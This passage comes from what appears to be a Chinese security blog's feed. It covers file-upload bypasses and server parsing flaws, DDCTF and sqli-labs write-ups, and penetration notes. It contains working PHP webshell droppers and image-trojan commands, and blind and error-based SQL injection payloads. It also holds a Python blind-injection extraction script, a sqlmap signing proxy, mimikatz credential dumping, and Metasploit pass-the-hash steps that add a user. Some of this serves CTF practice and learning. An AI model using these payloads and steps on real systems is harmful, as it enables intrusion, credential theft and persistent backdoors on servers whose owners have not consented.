overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h2 id="0x05-服务端检测绕过-文件内容检测"><a href="#0x05-服务端检测绕过-文件内容检测" class="headerlink" title="0x05 服务端检测绕过(文件内容检测)"></a>0x05 服务端检测绕过(文件内容检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>绕过方法：<br>针对渲染加载测试：代码注入绕过<br>针对二次渲染测试：攻击文件加载器</p></li></ul><h2 id="0x06-服务器解析漏洞"><a href="#0x06-服务器解析漏洞" class="headerlink" title="0x06 服务器解析漏洞"></a>0x06 服务器解析漏洞</h2><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：</p><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li></ul><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p>将shell语句，如</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code>xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>nginx 0.5.* [Success]</p><p>nginx 0.6.* [Success]</p><p>nginx 0.7 &lt;= 0.7.65 [Success]</p><p>nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h2 id="0x07-上传攻击框架"><a href="#0x07-上传攻击框架" class="headerlink" title="0x07 上传攻击框架"></a>0x07 上传攻击框架</h2><ul><li>轻量级检测绕过攻击</li><li>路径/扩展名检测绕过攻击</li><li>文件内容性检测绕过攻击</li><li>上传攻击框架</li></ul><h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h2><p>1.关掉上传文件的功能</p><p>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。<br>2.限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。<br>3.检查上传文件的类型<br>4.检查上传文件的内容<br>5.上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。</p><h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><p>命令：</p><pre><code>copy /b 1.jpg+2.php</code></pre><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DDCTF三道小结</title>
      <link href="/archives/a7a61e20/"/>
      <url>/archives/a7a61e20/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF三道小结"><a href="#DDCTF三道小结" class="headerlink" title="DDCTF三道小结"></a>DDCTF三道小结</h1><p>太菜了 就只能做出三道题，继续加油，明年再战</p><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd</p><p>进制转换，先将16进制转换为10进制，再对128求余，剩下的结果转换为字符。</p><pre><code class="python">ascii=&quot;212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253&quot;newlist=ascii.split()newlist2=ascii.split()for i in range(90,160):    for j in range(len(newlist)):        newlist2[j]=int(newlist[j])-i    for k in newlist2:        print chr(int(k)),    print &quot;&quot;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192226_410.png" alt=""></p><p> DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192234_752.png" alt=""></p><p>分析得到有一个压缩包</p><p>foremost出来得到zip，</p><p>解压密码在windows.jpg属性的备注</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192236_14.png" alt=""></p><p>Pactera</p><p>（插曲我一开始以为是crc32攻击）逃 </p><p>解压得到file</p><p>根据提示进行字符频度统计即可得到flag。</p><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><table><thead><tr><th>词</th><th>频次</th><th>频率 %</th><th></th></tr></thead><tbody><tr><td>1</td><td>D</td><td>3950</td><td>12.9381</td></tr><tr><td>2</td><td>C</td><td>1900</td><td>6.2234</td></tr><tr><td>3</td><td>T</td><td>1850</td><td>6.0596</td></tr><tr><td>4</td><td>F</td><td>1800</td><td>5.8958</td></tr><tr><td>5</td><td>{</td><td>1750</td><td>5.7321</td></tr><tr><td>6</td><td>t</td><td>1700</td><td>5.5683</td></tr><tr><td>7</td><td>u</td><td>1650</td><td>5.4045</td></tr><tr><td>8</td><td>0</td><td>1600</td><td>5.2407</td></tr><tr><td>9</td><td>k</td><td>1550</td><td>5.077</td></tr><tr><td>10</td><td>U</td><td>1500</td><td>4.9132</td></tr><tr><td>11</td><td>a</td><td>1450</td><td>4.7494</td></tr><tr><td>12</td><td>n</td><td>1400</td><td>4.5857</td></tr><tr><td>13</td><td>s</td><td>1350</td><td>4.4219</td></tr><tr><td>14</td><td>h</td><td>1300</td><td>4.2581</td></tr><tr><td>15</td><td>i</td><td>1250</td><td>4.0943</td></tr><tr><td>16</td><td>y</td><td>1200</td><td>3.9306</td></tr><tr><td>17</td><td>e</td><td>1150</td><td>3.7668</td></tr><tr><td>18</td><td>!</td><td>1100</td><td>3.603</td></tr><tr><td>19</td><td>}</td><td></td></tr></tbody></table><p>DDCTF{tu0kUanshiye!}</p><h2 id="Web-1-数据库的秘密"><a href="#Web-1-数据库的秘密" class="headerlink" title="Web 1 数据库的秘密"></a>Web 1 数据库的秘密</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212006_929.png" alt=""></p><p>使用插件modify headers加一个x-forward-for: 123.232.23.245</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212005_33.png" alt=""></p><p>打开题目是三个搜索框和一个数据表格，分析form表单发现隐藏一处所以更改本地复现进行注入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220047_85.png" alt=""></p><p>发现是bool盲注，并用burp fuzz一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220050_110.png" alt=""></p><p>发现union，database（）都被过滤</p><p>准语句：0’&amp;&amp;if(ascii(substr((select version()),1,1))&gt;0,1,0)#</p><p>得到库名：0’ &amp;&amp; if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;0,1,0)#：DDCTF</p><p>得到表名0’&amp;&amp;if(ascii(substr((select table_name from information_schema.tables where table_schema=’ddctf’))&gt;0,1,0)#：ctf_key1</p><p>得到字段名 0’&amp;&amp;if(ascii(substr((select column_name from information_schema.columns where table_name=’ctf_key1’ limit 0,1),9,1))&gt;0,1,0)#：secvalue</p><p>得到flag  0’&amp;&amp;if(ascii(substr((select secvalue from ctf_key1 limit 0,1),1,1))&gt;0,1,0)#   ====0’ &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),1,1)=’d’#</p><p>DDCTF{IKIDLHNZMKFUDEQE}</p><blockquote><p><strong>substr()函数</strong></p><pre><code>Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length)string substr(string, start, length)参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</code></pre></blockquote><p>另附大佬一的奇特方法直接显注：</p><p>此waf为假waf 使用超过100个参数可以绕过</p><p><a href="http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/" target="_blank" rel="external">http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/</a></p><p>大佬二sqlmap一把梭：</p><p>对于此题，采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br><code>proxy.php</code> 代码如下：</p><pre><code>&lt;?php@$id = $_REQUEST[&#39;id&#39;];@$title = $_REQUEST[&#39;title&#39;];@$author = $_REQUEST[&#39;author&#39;];@$date = $_REQUEST[&#39;date&#39;];$time = time();$sig = sha1(&#39;id=&#39;.$id.&#39;title=&#39;.$title.&#39;author=&#39;.$author.&#39;date=&#39;.$date.&#39;time=&#39;.$time.&#39;adrefkfweodfsdpiru&#39;);$ch = curl_init();$post = [    &#39;id&#39; =&gt; $id,    &#39;title&#39; =&gt; $title,    &#39;author&#39; =&gt; $author,    &#39;date&#39; =&gt; $date,];curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);curl_setopt($ch, CURLOPT_HTTPHEADER, array(    &#39;X-Forwarded-For: 123.232.23.245&#39;,    ));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $post);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, true);$ch_out = curl_exec($ch);$ch_info = curl_getinfo($ch);$header = substr($ch_out, 0, $ch_info[&#39;header_size&#39;]);$body = substr($ch_out, $ch_info[&#39;header_size&#39;]);http_response_code($ch_info[&#39;http_code&#39;]);//header($header);//echo $header;echo $body;</code></pre><p>sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于 <code>author</code>，获得 flag。</p><blockquote><p><code>sqlmap.py -u &#39;http://127.0.0.1/proxy.php?author=admin&#39; --dump</code></p></blockquote><p><img src="https://clannad.me/image/web-1.png" alt="Web-1"></p><p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a></p><p><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>高级入侵</title>
      <link href="/archives/1f382107/"/>
      <url>/archives/1f382107/</url>
      
        <content type="html"><![CDATA[<h1 id="高级入侵"><a href="#高级入侵" class="headerlink" title="高级入侵"></a>高级入侵</h1><h3 id="Windows权限分析与密码安全测试"><a href="#Windows权限分析与密码安全测试" class="headerlink" title="Windows权限分析与密码安全测试"></a>Windows权限分析与密码安全测试</h3><p>1.windows xp写入管理员权限<br>2.windows 2003默认权限<br>—–默认只安装静态HTTP服务器<br>—–增强的文件访问控制<br>—–父目录被禁用<br>—–坚持最小特权原则</p><p>注意给users组只有读取和运行权限</p><p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p><p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p><h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091859_724.png" alt=""></p><p>2.webshell  </p><p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p><p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="http://oy0tigw51.bkt.clouddn.com/201801091927_696.png" alt=""></p><p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091956_886.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801091957_230.png" alt=""></p><p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p><p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p><p>6.使用Ophcrack（kali）破解系统hash密码</p><h3 id="获取Webshell方法总结"><a href="#获取Webshell方法总结" class="headerlink" title="获取Webshell方法总结"></a>获取Webshell方法总结</h3><h4 id="主要通过谷歌搜索cms漏洞"><a href="#主要通过谷歌搜索cms漏洞" class="headerlink" title="主要通过谷歌搜索cms漏洞"></a>主要通过谷歌搜索cms漏洞</h4><p>phpcms discuz phpwind</p><h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p><pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;</code></pre><p>php爆路径方法收集<br><img src="http://oy0tigw51.bkt.clouddn.com/201801092306_259.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092322_426.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092325_134.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092326_398.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092327_366.png" alt=""></p><p>tomcat获取<br>weblogic获取<br>jboss获取</p><h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p><p>服务器端口被修改如何查找</p><p>cmd<br>tasklist /svc 寻找TermService</p><p>netstat -ano<br>查看所有端口</p><p>服务器处于内网如何连接</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>信息收集</title>
      <link href="/archives/312e3d12/"/>
      <url>/archives/312e3d12/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201803241742_133.png" alt=""></p><p>1、robots.txt<br>2、网站备份压缩文件<br>    可能为.rar、zip、.7z、.tar.gz、.bak、.txt、.swp等等，以及和网站信息有关的文件名www.rar、web、rar等等<br>3、Git导致文件泄露<br><img src="http://oy0tigw51.bkt.clouddn.com/201803241744_967.png" alt=""><br>4、DS_store导致文件泄露<br>5、SVN导致文件泄露<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><pre><code>1) 漏洞利用工具： Seay SVN漏洞利用工具2) 添加网站url</code></pre><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br>6、WEB-INF/web.xml泄露<br>        6.1、环境搭建<br>        6.2、访问页面<br>        6.3、扫描<br>        6.4、验证结果<br>7、Zoomeye搜索引擎使用<br>        7.1、搜索规则<br>        7.2、搜索技巧<br>        7.3、实战搜索<br>8、bing搜索引擎使用<br>9、Fofa搜索<br>10、站长工具<br>        10.1、站长工具Whois<br>        10.2、seo综合查询<br>        10.3、站长工具tool</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs less11-15</title>
      <link href="/archives/ced895c1/"/>
      <url>/archives/ced895c1/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less11-15"><a href="#sqli-labs-less11-15" class="headerlink" title="sqli-labs less11-15"></a>sqli-labs less11-15</h1><p>[TOC]</p><h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p>uname=1’ or 1=1 # &amp;passwd=x</p><h3 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h3><p>uname=1”) or 1=1 # &amp;passwd=x</p><h3 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h3><p>username：1’<br>Password： （随便输）<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘12’) LIMIT 0,1’ at line 1<br>‘) 我们可以知道程序对 id 进行了 ‘) 的处理。</p><p>uname=1’) or 1=1 # &amp;passwd=x</p><h3 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h3><p>uname=admin”and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><p>###less15POST型基于时间盲注<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Subm<br>it</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>uname=”) or 1=1#&amp;passwd=x<br>或<br>uname=”) or if(length(database())=8,1,sleep(2))#&amp;passwd=x</p><h3 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h3><p>Username：admin<br>Password：1’ You have an error in your SQL syntax; check the manual that corresponds<br>to your MySQL server version for the right syntax to use near ‘admin’’<br>at line 1<br>可以看到 admin’’ 说明在对密码的处理过程中使用的是 ‘’ 。<br>接下来利用盲注进行注入。<br>这里首先演示一下报错类型的盲注。<br>uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>Less-18 Header Injection- Error Based- string<br>在header里的User-Agent后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-19 Header Injection- Referer- Error Based- string<br>在header里的Referer后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-20 Cookie Injection- Error Based- string<br>在header里的Cookie附上payload：<br>uname=admin’ order by 3#<br>uname=x’ union select 1,database(),3#<br>uname=x’ union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-21 Cookie Injection- Error Based- complex - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin’) order by 3#<br>uname=x’) union select 1,database(),3#<br>uname=x’) union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-22 Cookie Injection- Error Based- Double Quotes - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin” order by 3#<br>uname=x” union select 1,database(),3#<br>uname=x” union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs  less7-10</title>
      <link href="/archives/9a0d7777/"/>
      <url>/archives/9a0d7777/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less7-10"><a href="#sqli-labs-less7-10" class="headerlink" title="sqli-labs  less7-10"></a>sqli-labs  less7-10</h1><p>[TOC]</p><h3 id="less-7：GET-基于错误-双引号-文件导出"><a href="#less-7：GET-基于错误-双引号-文件导出" class="headerlink" title="less-7：GET-基于错误-双引号-文件导出"></a>less-7：GET-基于错误-双引号-文件导出</h3><p>练习mysql的文件写入。我们的目的是将一句话木马写入到网站的Less-7目录下</p><p>先去用 ‘ “  之类的测试<br>发现，用 “ 返回页面无变化，用 ‘ 返回页面出错，说明这个结构肯定是带 ‘ 的。</p><p>‘ 的返回页面为：<br><img src="http://oy0tigw51.bkt.clouddn.com/201803172221_893.png" alt=""></p><p>但是绝对和单引号有关，所以试试 ‘)  ,  ‘))</p><p>‘) 也错了</p><p>‘)) 返回页面正常！！</p><p>说明sql语句应该是这样：</p><pre><code> select * from table where id = ((&#39;input&#39;));</code></pre><p><a href="http://43.247.91.228:84/Less-7/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-7/?id=1</a>‘)) union select 1,2,”&lt;?php @eval($_POST[‘cmd’]); ?&gt;” into outfile “/var/www/html/dd1.php”</p><h3 id="less-8：GET-基于布尔类型-盲注"><a href="#less-8：GET-基于布尔类型-盲注" class="headerlink" title="less-8：GET-基于布尔类型-盲注"></a>less-8：GET-基于布尔类型-盲注</h3><p>发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了<br><a href="http://43.247.91.228:84/Less-8/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-8/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;64 %23  </p><p>放一个脚本：</p><pre><code># coding: utf-8import urllib2import urllibsuccess_str = &quot;You are in&quot;getTable = &quot;users&quot;index = &quot;0&quot;url = &quot;http://43.247.91.228:84/Less-8/?id=1&quot;database = &quot;database()&quot;selectDB = &quot;select database()&quot;selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;# 获取字符串的长度def getLengthOfString(payload, string):    # 猜长度    lengthLeft = 0    lengthRigth = 0    guess = 10    # 确定长度上限，每次增加5    while 1:        # 如果长度大于guess        if getLengthResult(payload, string, guess) == True:            # 猜测值增加5            guess = guess + 5        else:            lengthRigth = guess            break            # print &quot;lengthRigth: &quot; + str(lengthRigth)    # 二分法查长度    mid = (lengthLeft + lengthRigth) / 2    while lengthLeft &lt; lengthRigth - 1:        # 如果长度大于等于mid        if getLengthResult(payload, string, mid) == True:            # 更新长度的左边界为mid            lengthLeft = mid        else:            # 否则就是长度小于mid            # 更新长度的右边界为mid            lengthRigth = mid            # 更新中值        mid = (lengthLeft + lengthRigth) / 2        # print lengthLeft, lengthRigth    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8    return lengthLeft# 获取名称def getName(payload, string, lengthOfString):    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符    tmp = &#39;&#39;    for i in xrange(1, lengthOfString + 1):        left = 32        right = 127        mid = (left + right) / 2        while left &lt; right - 1:            # 如果该字符串的第i个字符的ascii码大于等于mid            if getResult(payload, string, i, mid) == True:                # 则更新左边界                left = mid                mid = (left + right) / 2            else:                # 否则该字符串的第i个字符的ascii码小于mid                # 则更新右边界                right = mid                # 更新中值            mid = (left + right) / 2        tmp += chr(left)    return tmp# 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload  length：猜测的长度def getLengthResult(payload, string, length):    finalUrl = url + urllib.quote(payload % (string, length))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的asciidef getResult(payload, string, pos, ascii):    finalUrl = url + urllib.quote(payload % (string, pos, ascii))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False# 注入def inject():    # 猜数据库长度    lengthOfDBName = getLengthOfString(lengthPayload, database)    print &quot;length of DBname: &quot; + str(lengthOfDBName)    # 获取数据库名称    DBname = getName(asciiPayload, selectDB, lengthOfDBName)    print &quot;current database:&quot; + DBname    # 获取数据库中的表的个数    # print selectTableCountPayload    tableCount = getLengthOfString(selectTableCountPayload, DBname)    print &quot;count of talbe:&quot; + str(tableCount)  